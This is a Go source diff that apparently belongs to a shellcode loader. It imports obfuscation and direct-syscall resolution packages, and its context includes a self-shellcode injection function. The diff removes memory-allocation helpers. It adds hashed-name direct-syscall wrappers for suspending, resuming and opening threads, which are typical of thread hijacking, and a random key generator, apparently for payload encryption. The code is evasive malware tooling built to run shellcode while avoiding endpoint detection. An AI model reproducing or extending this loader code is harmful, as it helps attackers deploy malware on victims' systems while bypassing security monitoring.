@@ -4,44 +4,10 @@ import (
 	"loader/pkg/resolve"
 	"loader/pkg/obf"
 	"loader/pkg/types"
+	"crypto/rand"
 	"unsafe"
 	"fmt"
 )
-
-// Helper function to make NtAllocateVirtualMemory syscall
-func ntAllocateVirtualMemory(processHandle uintptr, baseAddress *uintptr, zeroBits uintptr, regionSize *uintptr, allocationType uint32, protect uint32) uint32 {
-	syscallNum := resolve.GetSyscallNumber(obf.GetHash("NtAllocateVirtualMemory"))
-	if syscallNum == 0 {
-		return types.STATUS_PROCEDURE_NOT_FOUND
-	}
-
-	ret, _ := resolve.Syscall(syscallNum,
-		processHandle,
-		uintptr(unsafe.Pointer(baseAddress)),
-		zeroBits,
-		uintptr(unsafe.Pointer(regionSize)),
-		uintptr(allocationType),
-		uintptr(protect),
-	)
-	return uint32(ret)
-}
-
-// Helper function to make NtFreeVirtualMemory syscall
-func ntFreeVirtualMemory(processHandle uintptr, baseAddress *uintptr, regionSize *uintptr, freeType uint32) uint32 {
-	syscallNum := resolve.GetSyscallNumber(obf.GetHash("NtFreeVirtualMemory"))
-	if syscallNum == 0 {
-		return types.STATUS_PROCEDURE_NOT_FOUND
-	}
-
-	ret, _ := resolve.Syscall(syscallNum,
-		processHandle,
-		uintptr(unsafe.Pointer(baseAddress)),
-		uintptr(unsafe.Pointer(regionSize)),
-		uintptr(freeType),
-	)
-	return uint32(ret)
-}
-
 
 // NtFreeVirtualMemory wrapper
 func NtFreeVirtualMemory(processHandle uintptr, baseAddress *uintptr, regionSize *uintptr, freeType uint32) (uint32, error) {
@@ -249,4 +215,61 @@ func NtInjectSelfShellcode(shellcode []byte) error {
 	NtClose(threadHandle)
 
 	return nil
+}
+
+// NtSuspendThread wrapper
+func NtSuspendThread(threadHandle uintptr, previousSuspendCount *uint32) (uint32, error) {
+	syscallNum := resolve.GetSyscallNumber(obf.GetHash("NtSuspendThread"))
+	if syscallNum == 0 {
+		return types.STATUS_PROCEDURE_NOT_FOUND, fmt.Errorf("failed to resolve NtSuspendThread")
+	}
+
+	var suspendCountPtr uintptr
+	if previousSuspendCount != nil {
+		suspendCountPtr = uintptr(unsafe.Pointer(previousSuspendCount))
+	}
+
+	ret, _ := resolve.Syscall(syscallNum, threadHandle, suspendCountPtr)
+	return uint32(ret), nil
+}
+
+// NtResumeThread wrapper
+func NtResumeThread(threadHandle uintptr, previousSuspendCount *uint32) (uint32, error) {
+	syscallNum := resolve.GetSyscallNumber(obf.GetHash("NtResumeThread"))
+	if syscallNum == 0 {
+		return types.STATUS_PROCEDURE_NOT_FOUND, fmt.Errorf("failed to resolve NtResumeThread")
+	}
+
+	var suspendCountPtr uintptr
+	if previousSuspendCount != nil {
+		suspendCountPtr = uintptr(unsafe.Pointer(previousSuspendCount))
+	}
+
+	ret, _ := resolve.Syscall(syscallNum, threadHandle, suspendCountPtr)
+	return uint32(ret), nil
+}
+
+// NtOpenThread wrapper
+func NtOpenThread(threadHandle *uintptr, desiredAccess uint32, objectAttributes uintptr, clientId *types.CLIENT_ID) (uint32, error) {
+	syscallNum := resolve.GetSyscallNumber(obf.GetHash("NtOpenThread"))
+	if syscallNum == 0 {
+		return types.STATUS_PROCEDURE_NOT_FOUND, fmt.Errorf("failed to resolve NtOpenThread")
+	}
+
+	ret, _ := resolve.Syscall(syscallNum,
+		uintptr(unsafe.Pointer(threadHandle)),
+		uintptr(desiredAccess),
+		objectAttributes,
+		uintptr(unsafe.Pointer(clientId)),
+	)
+	return uint32(ret), nil
+}
+
+func Keygen(keySize int) ([]byte, error) {
+	key := make([]byte, keySize)
+	_, err := rand.Read(key)
+	if err != nil {
+		return nil, fmt.Errorf("failed to generate random key: %w", err)
+	}
+	return key, nil
 }
